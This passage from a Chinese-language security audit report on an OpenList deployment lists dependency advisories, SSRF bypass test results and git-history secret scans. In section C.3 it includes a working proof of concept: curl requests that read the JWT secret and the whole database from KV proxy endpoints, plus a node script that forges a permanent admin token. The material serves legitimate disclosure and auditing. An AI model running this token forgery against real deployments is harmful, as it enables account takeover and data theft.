3. **未做动态渗透**：没有对真实部署发起请求，H-1/M-1/M-11 等结论来自代码路径确定性推导，未做端到端 PoC。特别是 M-12 的"多实例 state 失效"需在真实 Workers/EdgeOne 上验证命中率。
4. **提交历史只扫了"文件名 + 提交信息 + CI 配置差异"**：没有对全部 blob 做熵值扫描（blobless 克隆下逐 blob 拉取成本过高）。已确认历史中从未出现过 `.env` / `.dev.vars` / `*.pem` / `id_rsa` / `*.sql` / 备份 JSON 这类文件（全历史文件名去重后仅命中两个测试文件），CI 里也没有硬编码密钥（`04b25d8` 只是把空配置注释掉）。若要 100% 结论，建议在本地跑一次 `gitleaks detect --log-opts=--all`。
5. **未做压力测试**：M-1（限流全局共享）、M-3（WebDAV 无上限）、M-7（先读后判）、M-12（state 堆积）的实际影响与部署平台的内存上限强相关，未做实测。

---

## 附录 A：依赖漏洞核对原始记录

```
hono@4.12.28    9 项（6 项中危、1 项低危、2 项中危已合并计）
  GHSA-5r4p-p66f-jhc7  serveStatic 二次解码 → 绕过中间件   fixed 4.13.11
  GHSA-8j4g-w8fx-2239  CORS ReDoS                          fixed 4.12.34
  GHSA-f23p-vx2j-j53r  memo() 跨请求泄露                   fixed 4.12.34
  GHSA-54fx-42gc-7vw4  语言中间件复杂度 DoS                fixed 4.12.34
  GHSA-crvj-82cr-hjcx  query 读取 fragment 后参数          fixed 4.13.5
  GHSA-g6gw-c38x-mqfc  parseBody 点号嵌套内存耗尽          fixed 4.13.5
  GHSA-hxh3-vqpv-xpqv  hono/jsx boundary XSS（未使用 jsx）
  GHSA-79qm-7rj5-m7r9  Proxy Helper 未清理 Connection 头   fixed 4.12.34
  GHSA-gqvv-2mrq-wpjv  toSSG 路径穿越（未使用）
mysql2@3.11.0   2 项
  GHSA-3f6p-5ww8-9rcr  认证插件降级泄露明文口令            fixed 3.22.0
  GHSA-rgwj-5xj2-c3m3  zlib 解压炸弹                      fixed 3.23.1
zod@3.23.8      1 项  GHSA-mrhx-c7xc-m3w5 内存耗尽        fixed 4.6.6
axios@1.18.1   12 项（仅前端使用，建议 1.20.0）
handlebars@4.7.9 3 项（CRITICAL，但全仓库无 import，不打包）
```

## 附录 B：SSRF 判定复现

复刻 `pkg/http.ts` 的 `isSafeUrl` 逻辑后对 22 个边界地址的判定结果（完整输出见 `openlist-audit-poc/ssrf_check.mjs`，可 `node` 直接运行）：

| 输入 | 判定 | 说明 |
|---|---|---|
| `http://127.0.0.1/` | BLOCK | 正确 |
| `http://127.1/` | BLOCK | URL 规范化为 127.0.0.1，正确 |
| `http://0177.0.0.1/` | BLOCK | 八进制形式被规范化，正确 |
| `http://2130706433/` | BLOCK | 整数 IP 被规范化，正确 |
| `http://[::ffff:127.0.0.1]/` | BLOCK | IPv4-mapped，正确 |
| `http://[::7f00:1]/` | **ALLOW** | IPv4-compatible，未覆盖（L-6） |
| `http://[64:ff9b::7f00:1]/` | BLOCK | NAT64，正确 |
| `http://[2002:7f00:1::]/` | BLOCK | 6to4，正确 |
| `http://169.254.169.254/` | BLOCK | 元数据，正确 |
| `http://metadata.google.internal/` | BLOCK | 正确 |
| `http://127.0.0.1.nip.io/` | BLOCK | 硬编码 rebinding 服务，正确 |
| `http://attacker.example/`（A→127.0.0.1） | **ALLOW** | 无 DNS 解析（M-5，Node 部署有效） |

## 附录 C：第二轮补充审查记录

### C.1 快照一致性

```
$ git ls-tree HEAD -- src/backend/server/raw.ts
100644 blob 0d1909a5c7017381a766aef264cb00526a08e9b6  src/backend/server/raw.ts
$ git hash-object src/backend/server/raw.ts
0d1909a5c7017381a766aef264cb00526a08e9b6      ← 一致，审查对象即 HEAD
```

### C.2 提交历史密钥扫描

用 blobless 裸克隆拿到全部元数据（1.1 MB，1048 个 commit），对**历史中出现过的所有文件路径**去重后匹配敏感文件名：

```
$ git log --all --name-only --pretty=format: | sort -u \
    | grep -iE '\.env$|\.dev\.vars|\.pem$|id_rsa|id_ed25519|\.p12$|\.pfx$|credential|secret|\.cookies?$|token|\.sql$|\.bak$|backup.*\.json|\.wrangler|\.aws|netrc'

src/backend/server/default_credentials.test.ts
src/backend/server/token_epoch.test.ts
```

仅命中两个测试文件，**从未提交过 `.env` / `.dev.vars` / 私钥 / 数据库导出 / 备份**。CI 配置历史里也没有硬编码值（`04b25d8` 的 diff 只是把 `JWT_SECRET = ""`、`ENCRYPTION_SECRET = ""`、`[[kv_namespaces]] binding = ""` 注释掉）。

> 结论：不存在"历史泄漏了真密钥、后来删掉但仍在 git 里"的情况。GitHub 上 `main` 之外的 `theme/openlist-moe` 分支与主线差异 233 个文件，内容为旧版本快照，未引入新的敏感文件。

### C.3 KV 数据面调用链

```
后端（Node/Worker）                         边缘（EdgeOne Edge Function）
kv.ts:139  X-Internal-Call: <JWT_SECRET> ──► _kv-proxy.js:207  常量时间比对
kv.ts:368  GET  /kv-get?key=...          ──► kv-get  :20        kv.get(key)  ← 无前缀限制
kv.ts:405  POST /kv-put  {key,value}      ──► kv-put  :29        kv.put(key)  ← 无前缀限制
kv.ts:434  DELETE /kv-delete?key=...      ──► kv-delete:24       kv.delete(key)
kv.ts:533  GET  /kv-list?prefix=...       ──► kv-list :40        列出全部键
```

同一命名空间里的键包括：`openlist_db`（整库 JSON）、`openlist_jwt_secret`、`openlist_encryption_secret`。→ M-11。

在任意 EdgeOne 部署上，用一个普通管理员会话即可验证（**只在自有测试部署上执行**）：

```bash
# 1) 读出主密钥（若该部署走"自动生成密钥"路径）
curl -s "https://<your-domain>/kv-get?key=openlist_jwt_secret" \
     -H "Authorization: Bearer $ADMIN_JWT"

# 2) 列出命名空间里的全部键，并导出整库（含 users[].pwd_update_at / token_epoch）
curl -s "https://<your-domain>/kv-list" -H "Authorization: Bearer $ADMIN_JWT"
curl -s "https://<your-domain>/kv-get?key=openlist_db" -H "Authorization: Bearer $ADMIN_JWT"

# 3) 用读到的密钥 + 库里的字段，离线伪造一张永久 admin 令牌（无需再访问目标）
#    pwd_ts   = users[i].pwd_update_at
#    epoch    = users[i].token_epoch ?? 0
node -e '
const c=require("crypto");
const b=o=>Buffer.from(JSON.stringify(o)).toString("base64url");
const h=b({alg:"HS256",typ:"JWT"});
const p=b({id:1,username:"admin",role:2,pwd_ts:process.env.PWD_TS,
          epoch:Number(process.env.EPOCH||0),exp:Math.floor(Date.now()/1e3)+31536000});
console.log(h+"."+p+"."+c.createHmac("sha256",process.env.S).update(h+"."+p).digest("base64url"));
' S="<第 1 步的密钥>" PWD_TS="<库里的 pwd_update_at>" EPOCH="<库里的 token_epoch>"
```

关键在于：`jti` / `epoch` / `pwd_ts` 这三层吊销机制都只能对比"令牌与库"是否一致，而攻击者拿到的是**库本身 + 签名密钥**，因此三层同时失效。

### C.4 SSO state 生命周期

```
$ grep -n "stateStore" server/sso.ts
33: const stateStore = new Map<string, StateRecord>()
66:   stateStore.set(`${clientId}_${state}`, {...})
81:   const rec = stateStore.get(key)
83:   stateStore.delete(key)

$ grep -n "setInterval|setTimeout|prune|cleanup" server/sso.ts
（无输出）
```

写入点 1 处、删除点仅"回调命中时"1 处，无定时清扫、无容量上限。→ M-12。

### C.5 适配层逐文件结论

| 文件 | 行数 | 结论 |
|---|---|---|
| `functions/_kv-proxy.js` | 295 | 鉴权实现本身规范（alg pin、exp/nbf 必填、2FA pending 拒绝、常量时间比较），问题在**授权粒度**（M-11） |
| `functions/kv-{get,put,list,delete}/index.js` | 163 | 无 key 白名单；`kv-get`/`kv-list` 未限制 method（L-10） |
| `api/[...route].ts`、`api/_makers.ts`、`api/ping.ts` | 49 | 纯转发，无额外逻辑；`ping` 的 `app.get("*")` 只回 `pong`，无信息泄漏 |
| `node-functions/[[default]].js`、`cloud-functions/[[default]].js` | 40 | 构建期占位，返回 503，无风险 |
| `middleware.js` | 39 | SPA 回退，`isBackend` 正则覆盖 `/api /d /p /sd /health /kv-*`；**未覆盖 `/dav`、`/s3`**，浏览器直接访问会被改写成 `index.html`，属功能缺陷 |
| `handler.ts`、`loadEnv.js` | 24 | Lambda 适配；`loadEnv.js` 吞掉所有异常，读取失败静默无提示（低） |